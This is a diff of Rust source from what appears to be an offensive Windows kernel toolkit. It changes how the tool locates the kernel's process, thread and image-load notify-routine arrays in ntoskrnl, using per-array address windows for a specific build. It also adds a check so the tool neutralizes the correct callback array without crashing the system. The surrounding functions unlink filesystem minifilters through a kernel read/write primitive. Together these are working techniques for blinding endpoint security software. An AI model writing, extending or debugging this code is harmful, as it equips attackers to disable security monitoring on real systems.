@@ -279,8 +279,10 @@ pub unsafe fn unlink_minifilters(
 /// 6. Populate `RuntimeOffsets` with all KVAs
 ///
 /// For Process/Thread notify arrays that share the same `4C 8D 35` encoding,
-/// `resolve_rva_in_range` disambiguates using expected RVA bounds from the
-/// offset table (floor-matched by build number).
+/// `resolve_rva_in_range` disambiguates using their own verified RVA windows
+/// (`pattern_scan::*_NOTIFY_ARRAY_RANGE` — PDB-verified 17763.1339 layout;
+/// the windows are DISTINCT and disjoint). The resolved notify-array KVAs are
+/// additionally asserted pairwise-distinct at resolve time.
 ///
 /// # Arguments
 /// * `krw` — working kernel R/W primitive
@@ -294,6 +296,9 @@ pub unsafe fn unlink_minifilters(
 /// # Returns
 /// `RuntimeOffsets` with all resolvable fields populated. Fields that fail
 /// resolution are left as 0 (the caller can check with `notify_arrays_resolved()`).
+/// Returns `Err` if the three notify-array KVAs alias (two non-zero KVAs
+/// equal) — the shared-encoding disambiguation failed and assembling the tier
+/// from the aliased result would neutralize the WRONG array.
 ///
 /// # Safety
 /// Reads kernel memory (ntoskrnl image). Requires a working `KernelRw`.
@@ -338,56 +343,59 @@ pub fn resolve_offsets(
     };
 
     // Step 5: Build RuntimeOffsets from the resolved RVAs.
-    // For Process/Thread arrays (same `4C 8D 35` encoding), use
-    // `resolve_rva_in_range` with expected bounds from the offset table.
-    let resolve_with_range = |name: &str, lo: u32, hi: u32| -> usize {
-        // First try the simple map (first match).
-        if let Some(&rva) = map.get(name) {
-            return base + rva as usize;
-        }
-        // If the pattern was shared (Process/Thread), try range-filtered scan.
-        let site = match name {
-            "PspCreateProcessNotifyRoutine" => &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
-            "PspCreateThreadNotifyRoutine" => &pattern_scan::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
-            "PspLoadImageNotifyRoutine" => &pattern_scan::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
-            _ => return 0,
+    // The three notify arrays resolve via `resolve_rva_in_range` against their
+    // OWN verified RVA windows (pattern_scan::*_NOTIFY_ARRAY_RANGE —
+    // PDB-verified 17763.1339 layout: Thread < LoadImage < Process, 0x200
+    // apart, disjoint windows). The naive first-match path (scan_all_known's
+    // map) is NOT used for these three: Process and Thread share a
+    // byte-identical `4C 8D 35` encoding, so a first-match scan aliases them
+    // to the same RVA — the historical bug. Range-filtered resolution picks
+    // each array's own reference site.
+    let resolve_notify =
+        |site: &pattern_scan::RefSite, range: core::ops::Range<u32>| -> usize {
+            pattern_scan::resolve_rva_in_range(&image, site, range)
+                .map(|rva| base + rva as usize)
+                .unwrap_or(0)
         };
-        if let Some(rva) = pattern_scan::resolve_rva_in_range(&image, site, lo..hi) {
-            return base + rva as usize;
-        }
-        0
-    };
 
-    // Fallback expected-RVA bounds for each notify-array target (approximate,
-    // from known builds; broad enough to cover UBR drift ~0x8000 bytes).
-    // Each target gets its OWN named constant even though the values currently
-    // coincide — a build where one array's range drifts must only touch that
-    // target's constant (mirrors the anti-alias rule in pattern_scan.rs for the
-    // shared `4C 8D 35` bytes).
-    const PROCESS_NOTIFY_ARRAY_RANGE: core::ops::Range<u32> = 0x400_000..0x600_000;
-    const THREAD_NOTIFY_ARRAY_RANGE: core::ops::Range<u32> = 0x400_000..0x600_000;
-    const LOAD_IMAGE_NOTIFY_ARRAY_RANGE: core::ops::Range<u32> = 0x400_000..0x600_000;
-
-    let process_kva = resolve_with_range(
-        "PspCreateProcessNotifyRoutine",
-        PROCESS_NOTIFY_ARRAY_RANGE.start,
-        PROCESS_NOTIFY_ARRAY_RANGE.end,
+    let process_kva = resolve_notify(
+        &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
+        pattern_scan::PROCESS_NOTIFY_ARRAY_RANGE,
     );
-    let thread_kva = resolve_with_range(
-        "PspCreateThreadNotifyRoutine",
-        THREAD_NOTIFY_ARRAY_RANGE.start,
-        THREAD_NOTIFY_ARRAY_RANGE.end,
+    let thread_kva = resolve_notify(
+        &pattern_scan::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
+        pattern_scan::THREAD_NOTIFY_ARRAY_RANGE,
     );
-    let image_kva = resolve_with_range(
-        "PspLoadImageNotifyRoutine",
-        LOAD_IMAGE_NOTIFY_ARRAY_RANGE.start,
-        LOAD_IMAGE_NOTIFY_ARRAY_RANGE.end,
+    let image_kva = resolve_notify(
+        &pattern_scan::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
+        pattern_scan::LOAD_IMAGE_NOTIFY_ARRAY_RANGE,
     );
     let ps_active_kva = if let Some(&rva) = map.get("PsActiveProcessHead") {
         base + rva as usize
     } else {
         0
     };
+
+    // Resolve-time distinctness assertion: the three notify arrays are distinct
+    // kernel globals — any two resolving to the SAME non-zero KVA means the
+    // disambiguation failed (shared-encoding alias) and the tier would
+    // neutralize the WRONG array (BSOD risk). Refuse to assemble rather than
+    // hand back a broken RuntimeOffsets.
+    let kv = [process_kva, thread_kva, image_kva];
+    let names = ["process", "thread", "load-image"];
+    for i in 0..kv.len() {
+        for j in (i + 1)..kv.len() {
+            if kv[i] != 0 && kv[i] == kv[j] {
+                return Err(KitError::Other(alloc::format!(
+                    "notify-array aliasing: {} and {} both resolved to KVA 0x{:x} — \
+                     pattern-scan windows did not disambiguate this build; refusing to assemble",
+                    names[i],
+                    names[j],
+                    kv[i]
+                )));
+            }
+        }
+    }
 
     // Step 5b: Resolve FltGlobals KVA. Resolution priority:
     //   1. operator-supplied `--flt-rva` (most precise, overrides everything)
